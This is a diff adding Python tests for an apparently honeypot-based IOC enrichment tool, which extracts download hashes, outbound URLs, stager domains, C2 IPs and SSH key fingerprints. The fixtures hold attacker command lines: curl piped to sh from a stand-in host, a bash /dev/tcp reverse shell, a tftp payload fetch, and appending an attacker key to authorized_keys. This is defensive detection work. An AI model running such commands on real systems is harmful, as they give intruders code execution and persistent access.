@@ -306,3 +306,88 @@ class TestFilterInternalIps:
             _config(),
         )
         assert kept == {"203.0.113.50"}
+
+
+class TestV15DurableExtractors:
+    """Tests for date-scoped disk hashing and outbound C2/URL/domain/SSH-key extractors."""
+
+    def test_extract_hashes_from_disk_scoped_to_target_date(self, tmp_path: Path) -> None:
+        sensor_dir = tmp_path / "sensor"
+        dl = sensor_dir / "cowrie" / "downloads"
+        dl.mkdir(parents=True)
+        today_file = dl / "today.bin"
+        today_file.write_bytes(b"fresh")
+        old_file = dl / "old.bin"
+        old_file.write_bytes(b"stale")
+        today_ts = datetime(2026, 7, 10, 12, 0, tzinfo=UTC).timestamp()
+        old_ts = datetime(2026, 7, 1, 12, 0, tzinfo=UTC).timestamp()
+        os.utime(today_file, (today_ts, today_ts))
+        os.utime(old_file, (old_ts, old_ts))
+
+        hashes = extract_hashes_from_disk(sensor_dir, target_date=date(2026, 7, 10))
+        assert hashes == {hashlib.sha256(b"fresh").hexdigest()}
+
+    def test_extract_outbound_urls_domains_and_c2_ips_with_opsec_filtering(self) -> None:
+        from lantana.enrichment.ioc import (
+            extract_outbound_c2_ips,
+            extract_outbound_urls,
+            extract_stager_domains,
+        )
+
+        cfg = RedactionConfig(
+            infrastructure_ips=["192.0.2.10"],
+            infrastructure_cidrs=["10.50.99.0/24"],
+            pseudonym_map={"192.0.2.10": "honeypot-wan"},
+            infrastructure_hostnames=["vps-own.example.net"],
+        )
+        df = pl.DataFrame(
+            {
+                "file_url": [
+                    "http://203.0.113.77:8080/arm7.elf",
+                    "http://192.0.2.10/should-drop",
+                    "http://vps-own.example.net/should-drop",
+                ],
+                "actor_process_cmd_line": [
+                    "curl -s https://drop.example.org/stage.sh | sh; "
+                    "bash -i >& /dev/tcp/198.51.100.88/4444 0>&1; "
+                    "tftp -g -r x 198.51.100.89; curl http://127.0.0.1/local; "
+                    "curl http://10.ip-192-0-2.example.org/ptr-leak",
+                    None,
+                    None,
+                ],
+            }
+        )
+        urls = extract_outbound_urls(df, cfg)
+        assert "http://203.0.113.77:8080/arm7.elf" in urls
+        assert "https://drop.example.org/stage.sh" in urls
+        assert all("192.0.2.10" not in u for u in urls)
+        assert all("127.0.0.1" not in u for u in urls)
+        assert all("vps-own.example.net" not in u for u in urls)
+        assert all("10.ip-192-0-2" not in u for u in urls)
+
+        domains = extract_stager_domains(urls, cfg)
+        assert domains == {"drop.example.org"}
+
+        c2_ips = extract_outbound_c2_ips(df, cfg)
+        assert c2_ips == {"203.0.113.77", "198.51.100.88", "198.51.100.89"}
+
+    def test_extract_ssh_public_keys_computes_canonical_sha256_fingerprint(self) -> None:
+        import base64
+
+        from lantana.enrichment.ioc import extract_ssh_public_keys
+
+        raw_key = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + b"\x42" * 32
+        b64_blob = base64.b64encode(raw_key).decode("ascii")
+        expected_fp = "ssh-ed25519 SHA256:" + base64.b64encode(
+            hashlib.sha256(raw_key).digest()
+        ).decode("ascii").rstrip("=")
+        df = pl.DataFrame(
+            {
+                "actor_process_cmd_line": [
+                    f'echo "ssh-ed25519 {b64_blob} attacker@bot" >> ~/.ssh/authorized_keys',
+                    "uname -a",
+                ]
+            }
+        )
+        fps = extract_ssh_public_keys(df)
+        assert fps == {expected_fp}
